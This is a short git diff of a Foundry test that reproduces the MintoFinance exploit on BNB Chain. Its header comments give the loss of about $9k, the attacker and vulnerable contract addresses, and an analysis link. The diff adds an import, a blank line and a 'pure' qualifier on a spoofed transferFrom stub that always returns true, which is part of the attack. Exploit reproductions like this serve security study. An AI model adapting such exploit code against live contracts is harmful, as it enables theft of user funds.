@@ -3,6 +3,7 @@ pragma solidity ^0.8.9;
 
 import "forge-std/Test.sol";
 
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
 // @KeyInfo - Total Lost : ~9k US$
 // Attacker :  https://bscscan.com/address/0xc5001f60db92afcc23177a6c6b440a4226cb58bf
 // Attack Contract : https://bscscan.com/address/0xba91db0b31d60c45e0b03e6d515e45fcabc7b1cd
@@ -12,6 +13,7 @@ import "forge-std/Test.sol";
 // Vulnerable Contract Code : https://bscscan.com/address/0x0d116ed40831fef8e21ece57c8455ae3b1e4041b#code
 // @Analysis
 // Twitter Guy : https://twitter.com/bbbb/status/1683180340548890631?s=20
+
 interface ReferalCrowdSales {
 
     struct LinkParameters {
@@ -99,7 +101,7 @@ contract MintoFinance_exp is Test {
         console.log("BUSD balance after the Exploit", bUSDBalance);
     }
 
-    function transferFrom(address a, address b, uint256 amount) external returns (bool) {
+    function transferFrom(address a, address b, uint256 amount) external pure returns (bool) {
         return true;
     }
 
